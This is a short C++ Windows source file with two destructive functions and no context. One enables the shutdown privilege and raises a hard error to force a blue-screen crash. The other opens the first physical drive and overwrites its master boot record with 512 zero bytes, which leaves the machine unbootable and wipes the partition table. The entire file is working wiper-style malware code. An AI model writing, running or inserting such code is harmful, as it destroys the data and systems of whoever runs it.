#pragma comment(lib, "ntdll.lib")
#include <Windows.h>
#include <iostream>

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);

void BSOD() {
	BOOLEAN b;
	unsigned long response;

	RtlAdjustPrivilege(19, true, false, &b);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE,
                     0, 0, nullptr, 6, &response);
}

void MBR() {
    DWORD write;
    char mbr[512];

    ZeroMemory(&mbr, (sizeof mbr));
    HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0",
                            GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,
                            nullptr, OPEN_EXISTING, NULL, nullptr);
    WriteFile(MBR, mbr, 512, &write, nullptr);
    CloseHandle(MBR);
}
